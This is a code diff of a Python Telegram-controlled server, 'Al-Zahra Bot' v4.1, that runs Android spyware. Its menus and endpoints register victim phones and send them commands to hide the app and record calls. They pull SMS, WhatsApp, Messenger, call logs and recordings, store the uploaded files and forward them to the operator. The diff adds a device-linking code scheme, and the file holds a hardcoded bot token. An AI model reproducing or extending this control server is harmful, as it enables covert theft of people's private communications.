@@ -1,27 +1,24 @@
 #!/usr/bin/env python3
 """
-Al-Zahra Bot v3.0 - Server Side
-يعمل على السيرفر بشكل مستقل
+Al-Zahra Bot v4.1 - Server Side with Link System
 """
 
 import asyncio
 import json
 import logging
 import os
+import random
 import time
+import zipfile
 from datetime import datetime
 from aiohttp import web
 
-# إعداد التسجيل
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger('AlZahraBot')
 
-# ═══════════════════════════════════════════
-# الإعدادات
-# ═══════════════════════════════════════════
 BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
 OWNER_CHAT_ID = "7344776596"
 API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
@@ -32,9 +29,10 @@ PORT = 8443
 # ═══════════════════════════════════════════
 class DataStore:
     def __init__(self):
-        self.devices = {}  # {chat_id: device_info}
+        self.devices = {}  # {device_id: device_info}
         self.pending_commands = {}  # {device_id: [commands]}
-        self.received_data = {}  # {device_id: [data_files]}
+        self.link_codes = {}  # {code: device_id}
+        self.device_files = {}  # {device_id: [file_paths]}
         self.last_update_id = 0
 
 data_store = DataStore()
@@ -43,11 +41,8 @@ data_store = DataStore()
 # وظائف مساعدة
 # ═══════════════════════════════════════════
 async def send_request(method, params=None):
-    """إرسال طلب لـ Telegram API"""
     import aiohttp
-    
     url = f"{API_BASE}/{method}"
-    
     try:
         async with aiohttp.ClientSession() as session:
             if params:
@@ -61,45 +56,27 @@ async def send_request(method, params=None):
         return None
 
 async def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
-    """إرسال رسالة"""
-    params = {
-        "chat_id": str(chat_id),
-        "text": text,
-        "parse_mode": parse_mode
-    }
+    params = {"chat_id": str(chat_id), "text": text, "parse_mode": parse_mode}
     if reply_markup:
         params["reply_markup"] = json.dumps(reply_markup)
-    
     return await send_request("sendMessage", params)
 
 async def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode="Markdown"):
-    """تعديل رسالة"""
-    params = {
-        "chat_id": str(chat_id),
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": parse_mode
-    }
+    params = {"chat_id": str(chat_id), "message_id": message_id, "text": text, "parse_mode": parse_mode}
     if reply_markup:
         params["reply_markup"] = json.dumps(reply_markup)
-    
     return await send_request("editMessageText", params)
 
 async def answer_callback(callback_query_id, text=None):
-    """الرد على callback"""
     params = {"callback_query_id": callback_query_id}
     if text:
         params["text"] = text
         params["show_alert"] = True
-    
     return await send_request("answerCallbackQuery", params)
 
 async def send_document(chat_id, file_path, caption=""):
-    """إرسال ملف"""
     import aiohttp
-    
     url = f"{API_BASE}/sendDocument"
-    
     try:
         async with aiohttp.ClientSession() as session:
             data = aiohttp.FormData()
@@ -107,7 +84,6 @@ async def send_document(chat_id, file_path, caption=""):
             data.add_field("caption", caption)
             data.add_field("parse_mode", "Markdown")
             data.add_field("document", open(file_path, "rb"))
-            
             async with session.post(url, data=data) as resp:
                 return await resp.json()
     except Exception as e:
@@ -117,14 +93,18 @@ async def send_document(chat_id, file_path, caption=""):
 def get_timestamp():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
+def generate_link_code():
+    """توليد كود ربط من 9 أرقام"""
+    return ''.join([str(random.randint(0, 9)) for _ in range(9)])
+
 # ═══════════════════════════════════════════
 # لوحات التحكم
 # ═══════════════════════════════════════════
 def get_main_menu():
-    """القائمة الرئيسية"""
     keyboard = {
         "inline_keyboard": [
             [{"text": "📱 الأجهزة المتصلة", "callback_data": "devices_list"}],
+            [{"text": "🔗 ربط جهاز جديد", "callback_data": "link_device"}],
             [{"text": "⚙️ الإعدادات", "callback_data": "settings_main"}],
             [{"text": "📊 حالة النظام", "callback_data": "system_status"}]
         ]
@@ -132,9 +112,7 @@ def get_main_menu():
     return keyboard
 
 def get_devices_menu():
-    """قائمة الأجهزة"""
     devices = data_store.devices
-    
     if not devices:
         keyboard = {
             "inline_keyboard": [
@@ -152,11 +130,9 @@ def get_devices_menu():
     
     buttons.append([{"text": "🔄 تحديث", "callback_data": "devices_list"}])
     buttons.append([{"text": "🔙 رجوع", "callback_data": "back_main"}])
-    
     return {"inline_keyboard": buttons}
 
 def get_device_menu(device_id):
-    """قائمة الجهاز"""
     keyboard = {
         "inline_keyboard": [
             [{"text": "📨 سحب SMS", "callback_data": f"cmd_{device_id}_sms"}],
@@ -164,15 +140,15 @@ def get_device_menu(device_id):
             [{"text": "💬 سحب واتساب", "callback_data": f"cmd_{device_id}_whatsapp"}],
             [{"text": "📩 سحب ماسنجر", "callback_data": f"cmd_{device_id}_messenger"}],
             [{"text": "📞 سجل المكالمات", "callback_data": f"cmd_{device_id}_calls"}],
-            [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
             [{"text": "🎙️ المكالمات المسجلة", "callback_data": f"cmd_{device_id}_recordings"}],
+            [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
+            [{"text": "📦 سحب الكل (ZIP)", "callback_data": f"cmd_{device_id}_all"}],
             [{"text": "🔙 رجوع", "callback_data": "devices_list"}]
         ]
     }
     return keyboard
 
 def get_settings_menu():
-    """قائمة الإعدادات"""
     keyboard = {
         "inline_keyboard": [
             [{"text": "🔐 التحكم بالصلاحيات", "callback_data": "settings_permissions"}],
@@ -187,82 +163,115 @@ def get_settings_menu():
 # معالجة الأوامر
 # ═══════════════════════════════════════════
 async def handle_message(message):
-    """معالجة الرسائل الواردة"""
     chat_id = message.get("chat", {}).get("id")
     text = message.get("text", "")
     
-    # التحقق من المالك
     if str(chat_id) != OWNER_CHAT_ID:
         await send_message(chat_id, "⛔ غير مصرح لك باستخدام هذا البوت")
         return
     
-    # معالجة الأوامر
+    # الأوامر
     if text == "/start" or text == "/help":
         await send_message(
             chat_id,
             f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}",
             reply_markup=get_main_menu()
         )
-    elif text.startswith("/"):
-        # أوامر مباشرة
-        await handle_direct_command(chat_id, text)
+    
+    elif text == "/link":
+        # توليد كود ربط جديد
+        code = generate_link_code()
+        # حفظ الكود مؤقتاً
+        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
+        
+        await send_message(
+            chat_id,
+            f"🔗 *كود الربط الجديد*\n\n"
+            f"`{code}`\n\n"
+            f"⏰ الكود صالح لمدة 5 دقائق\n"
+            f"📱 أدخل هذا الكود في التطبيق",
+            parse_mode="Markdown"
+        )
+    
+    elif text == "/devices":
+        await show_devices(chat_id)
+    
+    elif text == "/settings":
+        await send_message(chat_id, "⚙️ *الإعدادات*", reply_markup=get_settings_menu())
+    
+    elif text == "/status":
+        await show_system_status(chat_id)
+    
+    elif len(text) == 9 and text.isdigit():
+        # التحقق من كود الربط
+        await verify_link_code(chat_id, text)
+    
     else:
         await send_message(chat_id, "❓ أمر غير معروف. استخدم /start")
 
-async def handle_direct_command(chat_id, command):
-    """معالجة الأوامر المباشرة"""
-    parts = command.split()
-    cmd = parts[0].lower()
-    
-    if cmd == "/devices":
-        await show_devices(chat_id)
-    elif cmd == "/settings":
-        await send_message(chat_id, "⚙️ *الإعدادات*", reply_markup=get_settings_menu())
-    elif cmd == "/status":
-        await show_system_status(chat_id)
+async def verify_link_code(chat_id, code):
+    """التحقق من كود الربط"""
+    if code in data_store.link_codes:
+        link_info = data_store.link_codes[code]
+        
+        # التحقق من صلاحية الكود (5 دقائق)
+        if time.time() - link_info["time"] > 300:
+            del data_store.link_codes[code]
+            await send_message(chat_id, "⏰ الكود منتهي الصلاحية. أرسل /link للحصول على كود جديد")
+            return
+        
+        # ربط الجهاز
+        device_id = link_info.get("device_id")
+        if device_id:
+            data_store.devices[device_id]["linked"] = True
+            data_store.devices[device_id]["owner"] = chat_id
+            del data_store.link_codes[code]
+            
+            await send_message(chat_id, f"✅ تم ربط الجهاز بنجاح!\n\n📱 {data_store.devices[device_id].get('model', 'غير معروف')}")
+        else:
+            await send_message(chat_id, "⏳ في انتظار اتصال الجهاز...")
     else:
-        await send_message(chat_id, f"❓ أمر غير معروف: {command}")
+        await send_message(chat_id, "❌ كود غير صحيح")
 
 async def handle_callback(callback_query):
-    """معالجة الأزرار"""
     chat_id = callback_query.get("message", {}).get("chat", {}).get("id")
     message_id = callback_query.get("message", {}).get("message_id")
     data = callback_query.get("data", "")
     query_id = callback_query.get("id")
     
-    # التحقق من المالك
     if str(chat_id) != OWNER_CHAT_ID:
         await answer_callback(query_id, "⛔ غير مصرح")
         return
     
     logger.info(f"Callback: {data}")
     
-    # ═══════════════════════════════════════════
     # التنقل الرئيسي
-    # ═══════════════════════════════════════════
     if data == "back_main":
-        await edit_message(
-            chat_id, message_id,
-            f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}",
-            reply_markup=get_main_menu()
-        )
+        await edit_message(chat_id, message_id, f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}", reply_markup=get_main_menu())
     
     elif data == "devices_list":
         await show_devices(chat_id, message_id)
     
-    elif data == "settings_main":
+    elif data == "link_device":
+        code = generate_link_code()
+        data_store.link_codes[code] = {"chat_id": chat_id, "time": time.time()}
+        
         await edit_message(
             chat_id, message_id,
-            "⚙️ *الإعدادات*",
-            reply_markup=get_settings_menu()
+            f"🔗 *ربط جهاز جديد*\n\n"
+            f"الكود: `{code}`\n\n"
+            f"⏰ صالح لمدة 5 دقائق\n"
+            f"📱 أدخل هذا الكود في التطبيق",
+            reply_markup={"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_main"}]]}
         )
+    
+    elif data == "settings_main":
+        await edit_message(chat_id, message_id, "⚙️ *الإعدادات*", reply_markup=get_settings_menu())
     
     elif data == "system_status":
         await show_system_status(chat_id, message_id)
     
-    # ═══════════════════════════════════════════
     # الأجهزة
-    # ═══════════════════════════════════════════
     elif data.startswith("device_"):
         device_id = data.replace("device_", "")
         if device_id in data_store.devices:
@@ -272,16 +281,11 @@ async def handle_callback(callback_query):
             text += f"الحالة: {'🟢 متصل' if device.get('online') else '🔴 غير متصل'}\n"
             text += f"آخر اتصال: {device.get('last_seen', 'N/A')}"
             
-            await edit_message(
-                chat_id, message_id, text,
-                reply_markup=get_device_menu(device_id)
-            )
+            await edit_message(chat_id, message_id, text, reply_markup=get_device_menu(device_id))
         else:
             await answer_callback(query_id, "❌ الجهاز غير متصل")
     
-    # ═══════════════════════════════════════════
     # أوامر الجهاز
-    # ═══════════════════════════════════════════
     elif data.startswith("cmd_"):
         parts = data.split("_", 2)
         if len(parts) >= 3:
@@ -290,26 +294,18 @@ async def handle_callback(callback_query):
             
             if device_id in data_store.devices:
                 await answer_callback(query_id, f"⏳ جاري إرسال الأمر...")
-                await send_message(chat_id, f"⏳ جاري معالجة الطلب...")
                 
-                # إضافة الأمر للقائمة المعلقة
                 if device_id not in data_store.pending_commands:
                     data_store.pending_commands[device_id] = []
                 data_store.pending_commands[device_id].append(action)
                 
-                await send_message(chat_id, f"✅ تم إرسال الأمر: {action}")
+                await send_message(chat_id, f"✅ تم إرسال الأمر: {action}\n⏳ في انتظار رد الجهاز...")
             else:
                 await answer_callback(query_id, "❌ الجهاز غير متصل")
     
-    # ═══════════════════════════════════════════
     # الإعدادات
-    # ═══════════════════════════════════════════
     elif data == "settings_permissions":
-        await edit_message(
-            chat_id, message_id,
-            "🔐 *التحكم بالصلاحيات*",
-            reply_markup=get_permissions_menu()
-        )
+        await edit_message(chat_id, message_id, "🔐 *التحكم بالصلاحيات*", reply_markup=get_permissions_menu())
     
     elif data == "settings_hide":
         await answer_callback(query_id, "⏳ جاري إرسال أمر الإخفاء...")
@@ -328,10 +324,9 @@ async def handle_callback(callback_query):
         await send_message(chat_id, "⏹️ تم إيقاف تسجيل المكالمات")
     
     else:
-        await answer_callback(query_id, f"❓ أمر غير معروف")
+        await answer_callback(query_id, "❓ أمر غير معروف")
 
 def get_permissions_menu():
-    """قائمة الصلاحيات"""
     keyboard = {
         "inline_keyboard": [
             [{"text": "📨 تفعيل SMS", "callback_data": "perm_sms_on"}, {"text": "📨 تعطيل SMS", "callback_data": "perm_sms_off"}],
@@ -345,7 +340,6 @@ def get_permissions_menu():
     return keyboard
 
 async def show_devices(chat_id, message_id=None):
-    """عرض الأجهزة"""
     devices = data_store.devices
     
     if not devices:
@@ -362,12 +356,13 @@ async def show_devices(chat_id, message_id=None):
         await send_message(chat_id, text, reply_markup=get_devices_menu())
 
 async def show_system_status(chat_id, message_id=None):
-    """عرض حالة النظام"""
-    import psutil
-    
-    cpu = psutil.cpu_percent()
-    memory = psutil.virtual_memory().percent
-    disk = psutil.disk_usage('/').percent
+    try:
+        import psutil
+        cpu = psutil.cpu_percent()
+        memory = psutil.virtual_memory().percent
+        disk = psutil.disk_usage('/').percent
+    except:
+        cpu = memory = disk = 0
     
     text = f"📊 *حالة النظام*\n\n"
     text += f"💻 CPU: {cpu}%\n"
@@ -387,17 +382,9 @@ async def show_system_status(chat_id, message_id=None):
 # استقبال التحديثات
 # ═══════════════════════════════════════════
 async def get_updates():
-    """استقبال التحديثات من Telegram"""
-    global data_store
-    
     while True:
         try:
-            params = {
-                "offset": data_store.last_update_id + 1,
-                "limit": 10,
-                "timeout": 30
-            }
-            
+            params = {"offset": data_store.last_update_id + 1, "limit": 10, "timeout": 30}
             result = await send_request("getUpdates", params)
             
             if result and result.get("ok"):
@@ -417,31 +404,33 @@ async def get_updates():
             await asyncio.sleep(5)
 
 # ═══════════════════════════════════════════
-# خادم الويب (للتواصل مع التطبيق)
+# خادم الويب
 # ═══════════════════════════════════════════
 async def handle_device_register(request):
-    """تسجيل جهاز جديد"""
     try:
         data = await request.json()
         device_id = data.get("device_id")
         model = data.get("model", "Unknown")
         android = data.get("android", "Unknown")
+        device_code = data.get("device_code")
         
         data_store.devices[device_id] = {
             "model": model,
             "android": android,
             "online": True,
             "last_seen": get_timestamp(),
-            "registered": get_timestamp()
+            "registered": get_timestamp(),
+            "linked": False
         }
+        
+        # ربط بالكود إذا وجد
+        if device_code and device_code in data_store.link_codes:
+            data_store.link_codes[device_code]["device_id"] = device_id
+            data_store.devices[device_id]["linked"] = True
         
         logger.info(f"Device registered: {device_id} ({model})")
         
-        # إشعار المالك
-        await send_message(
-            OWNER_CHAT_ID,
-            f"🟢 جهاز جديد متصل!\n📱 {model}\n🤖 Android {android}"
-        )
+        await send_message(OWNER_CHAT_ID, f"🟢 جهاز جديد متصل!\n📱 {model}\n🤖 Android {android}")
         
         return web.json_response({"status": "ok"})
         
@@ -450,24 +439,48 @@ async def handle_device_register(request):
         return web.json_response({"status": "error", "message": str(e)})
 
 async def handle_device_data(request):
-    """استقبال بيانات من الجهاز"""
     try:
-        data = await request.json()
-        device_id = data.get("device_id")
-        data_type = data.get("type")
-        content = data.get("content")
+        reader = await request.multipart()
         
-        # حفظ البيانات
-        if device_id not in data_store.received_data:
-            data_store.received_data[device_id] = []
+        device_id = None
+        data_type = None
+        file_path = None
         
-        data_store.received_data[device_id].append({
-            "type": data_type,
-            "content": content,
-            "time": get_timestamp()
-        })
+        while True:
+            part = await reader.next()
+            if part is None:
+                break
+            
+            if part.name == "device_id":
+                device_id = await part.text()
+            elif part.name == "type":
+                data_type = await part.text()
+            elif part.name == "file":
+                # حفظ الملف
+                upload_dir = "/opt/alzahra/uploads"
+                os.makedirs(upload_dir, exist_ok=True)
+                
+                filename = f"{device_id}_{data_type}_{int(time.time())}_{part.filename}"
+                file_path = os.path.join(upload_dir, filename)
+                
+                with open(file_path, "wb") as f:
+                    while True:
+                        chunk = await part.read_chunk()
+                        if not chunk:
+                            break
+                        f.write(chunk)
         
-        logger.info(f"Data received from {device_id}: {data_type}")
+        if device_id and data_type:
+            if device_id not in data_store.device_files:
+                data_store.device_files[device_id] = []
+            data_store.device_files[device_id].append({"type": data_type, "path": file_path})
+            
+            # إرسال إشعار للمالك
+            await send_message(OWNER_CHAT_ID, f"📥 بيانات جديدة من {device_id}\n📁 النوع: {data_type}")
+            
+            # إرسال الملف مباشرة
+            if file_path and os.path.exists(file_path):
+                await send_document(OWNER_CHAT_ID, file_path, f"📱 {device_id} - {data_type}")
         
         return web.json_response({"status": "ok"})
         
@@ -476,38 +489,43 @@ async def handle_device_data(request):
         return web.json_response({"status": "error", "message": str(e)})
 
 async def handle_get_commands(request):
-    """جلب الأوامر المعلقة للجهاز"""
     try:
         device_id = request.query.get("device_id", "")
-        
         commands = data_store.pending_commands.get(device_id, [])
         data_store.pending_commands[device_id] = []
-        
         return web.json_response({"commands": commands})
-        
     except Exception as e:
-        logger.error(f"Get commands error: {e}")
         return web.json_response({"commands": []})
 
+async def handle_device_status(request):
+    try:
+        data = await request.json()
+        device_id = data.get("device_id")
+        
+        if device_id in data_store.devices:
+            data_store.devices[device_id]["online"] = True
+            data_store.devices[device_id]["last_seen"] = get_timestamp()
+        
+        return web.json_response({"status": "ok"})
+    except:
+        return web.json_response({"status": "error"})
+
 async def init_web_app():
-    """تهيئة خادم الويب"""
     app = web.Application()
     app.router.add_post("/api/register", handle_device_register)
     app.router.add_post("/api/data", handle_device_data)
     app.router.add_get("/api/commands", handle_get_commands)
-    
+    app.router.add_post("/api/status", handle_device_status)
     return app
 
 # ═══════════════════════════════════════════
 # التشغيل الرئيسي
 # ═══════════════════════════════════════════
 async def main():
-    """الدالة الرئيسية"""
     logger.info("=" * 50)
-    logger.info("  Al-Zahra Bot v3.0 Starting...")
+    logger.info("  Al-Zahra Bot v4.1 Starting...")
     logger.info("=" * 50)
     
-    # تشغيل خادم الويب
     web_app = await init_web_app()
     runner = web.AppRunner(web_app)
     await runner.setup()
@@ -516,8 +534,17 @@ async def main():
     
     logger.info(f"Web server started on port {PORT}")
     
-    # تشغيل استقبال التحديثات
-    await get_updates()
+    # تنظيف الأكواد المنتهية
+    async def cleanup_codes():
+        while True:
+            await asyncio.sleep(60)
+            current_time = time.time()
+            expired = [code for code, info in data_store.link_codes.items() 
+                      if current_time - info["time"] > 300]
+            for code in expired:
+                del data_store.link_codes[code]
+    
+    await asyncio.gather(get_updates(), cleanup_codes())
 
 if __name__ == "__main__":
     asyncio.run(main())
